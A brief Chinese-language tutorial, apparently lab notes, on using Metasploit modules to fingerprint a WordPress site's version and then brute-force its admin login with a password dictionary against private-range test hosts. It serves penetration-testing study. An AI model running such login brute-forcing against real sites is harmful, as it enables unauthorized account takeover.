一、使用Metasploit自动探索版本信息

1、search wordpress type auxiliary

![](../Images/8f1b1963e80e795769e752a981f59c32.png)

2、随便选择一个

use 1

3、查看需要设置的参数，需要设置RHOSTS，设置为目标地址

show options

set  RHOSTS 192.168.139.133

![](../Images/d14a3e02199004054f3a79e5df39e5ff.png)

4、运行run

![](../Images/f7c11f1a47cdd8682c35070512cc8e45.png)

  

二、使用Metasploit进行枚举

1、选择要用的模块

use auxiliary/scanner/http/wordpress\_login\_enum

2、查看需要设置的模块

show options

![](../Images/6e3dc9194500d9c0e0d2bcc0eed1fd68.png)

3、设置目标主机

set RHOSTS 192.168.1.111

2、设置目标主机端口号

set RPORT 8080

3、设置用户为admin

set username admin

4、设置密码为一个字典

set pass\_file /home/aiyou/桌面/pass

5、run运行

![](../Images/a651fff236c95dcc15b93f0a168d15a6.png)
